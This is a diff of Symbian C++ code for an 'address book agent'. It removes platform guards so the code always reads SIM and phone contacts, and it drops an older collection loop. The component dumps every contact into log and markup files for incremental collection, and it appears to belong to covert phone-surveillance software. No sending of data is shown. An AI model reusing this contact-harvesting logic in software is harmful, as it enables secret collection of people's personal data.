@@ -84,12 +84,10 @@ CAgentAddressbook::CAgentAddressbook() :
 
 CAgentAddressbook::~CAgentAddressbook()
 	{
-	#ifndef __SERIES60_3X__  //look for SIM contacts only in Symbian3
 	delete iPhoneStoreMonitor;
 	iBookStore.Close();
 	iPhone.Close();
 	iTelServer.Close();
-	#endif
 	
 	__FLOG(_L("Destructor"));
 	delete iLongTask;
@@ -125,14 +123,12 @@ void CAgentAddressbook::ConstructL(const TDesC8& params)
 	iLongTask = CLongTaskAO::NewL(*this);
 	iMarkupFile = CLogFile::NewL(iFs);
 	
-	#ifndef __SERIES60_3X__  //look for SIM contacts only in Symbian3
 	iTelServer.Connect();
 	RTelServer::TPhoneInfo info;
 	iTelServer.GetPhoneInfo(0, info);
 	iPhone.Open(iTelServer, info.iName);
 	iBookStore.Open(iPhone, _L("S7"));
 	iPhoneStoreMonitor = CPhoneStoreMonitor::NewL(iBookStore,*this); 
-	#endif
 	}
 
 void CAgentAddressbook::StartAgentCmdL()
@@ -191,11 +187,9 @@ void CAgentAddressbook::StartAgentCmdL()
 	iContacts = CContactIdArray::NewL(iFilter->iIds);
 	
 	iContactIndex = 0;
-	#ifndef __SERIES60_3X__  //look for SIM contacts only in Symbian3
 	iSimEntries = 0;
 	iSimIndex = 0;
 	iSimDump = EFalse;
-	#endif	
 	
 	iLongTask->NextRound();
 	}
@@ -267,7 +261,6 @@ HBufC* CAgentAddressbook::ReadFieldAsTextL(const CContactItemField& itemField)
 	}
 
 //code inspiration from symbian sources: mm_pbutil.cpp, phone book record format is TLV (tag-length-value)
-#ifndef __SERIES60_3X__
 HBufC8* CAgentAddressbook::GetSimContactBufferL(const TDesC8& aRecordBuf)
 	{
 	CBufBase* buffer = CBufFlat::NewL(50);
@@ -393,7 +386,6 @@ HBufC8* CAgentAddressbook::GetSimContactBufferL(const TDesC8& aRecordBuf)
 	CleanupStack::PopAndDestroy(buffer);
 	return result;
 	}
-#endif
 
 HBufC8* CAgentAddressbook::GetContactBufferL(const CContactItem& item)
 	{
@@ -458,7 +450,6 @@ HBufC8* CAgentAddressbook::GetContactBufferL(const CContactItem& item)
 	return result;
 	}
 
-#ifndef __SERIES60_3X__  //only Symbian3
 void CAgentAddressbook::DoOneRoundL()
 	{
 	// If the Agent has been stopped, don't proceed on the next round...
@@ -574,60 +565,6 @@ void CAgentAddressbook::DoOneRoundL()
 		iLongTask->NextRound();
 		}
 	}
-#else  //non Symbian3 devices (5th and 3rd)
-void CAgentAddressbook::DoOneRoundL()
-	{
-	// If the Agent has been stopped, don't proceed on the next round...
-	if (iStopLongTask)
-		return;
-	if (iContactIndex >= iContacts->Count())
-		{
-		if(iContactIndex == 0)  
-			return;
-		// write markup, we have finished the initial dump
-		// and we write the date of the most recent changed/added item
-		RBuf8 buf(GetTTimeBufferL(iTimestamp));
-		buf.CleanupClosePushL();
-		if (buf.Length() > 0)
-			{
-			iMarkupFile->WriteMarkupL(Type(),buf);
-			}
-		CleanupStack::PopAndDestroy(&buf);
-		return;  
-		}
-	TContactItemId itemId = (*iContacts)[iContactIndex];
-
-	// Maybe the item has been removed in the meanwhile...
-	if (itemId != KNullContactId)
-		{
-		__FLOG_1(_L("Contact:%d"), iContactIndex);
-		CContactItem* item = iContDb->ReadContactLC(itemId);
-		RBuf8 buf(GetContactBufferL(*item));
-		buf.CleanupClosePushL();
-		if (buf.Length() > 0)
-			{
-			TInt value;
-			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold,value );
-			if(value)
-				{
-				// dump the buffer to the file log. 
-				AppendLogL(buf);
-				// check the date against the last saved one and update if necessary
-				TTime time = item->LastModified();
-				if (iTimestamp < time)
-					{
-					iTimestamp = time;
-					} 
-				}
-			}
-		CleanupStack::PopAndDestroy(&buf);
-		CleanupStack::PopAndDestroy(item);
-		}
-	iContactIndex++;
-
-	iLongTask->NextRound();
-	}
-#endif
 
 TInt CAgentAddressbook::GetTypeFromItemField(const CContactItemField& aField)
 	{
@@ -792,7 +729,6 @@ HBufC8* CAgentAddressbook::GetTTimeBufferL(const TTime aTime)
 }
 
 
-#ifndef __SERIES60_3X__
 void CAgentAddressbook::PhoneStoreEventL(TUint32 aEvent, TInt aIndex)
 	{
 	switch(aEvent)
@@ -833,7 +769,6 @@ void CAgentAddressbook::PhoneStoreEventL(TUint32 aEvent, TInt aIndex)
 			break;
 		}
 	}
-#endif
 
 /*
  AddressBook Agent
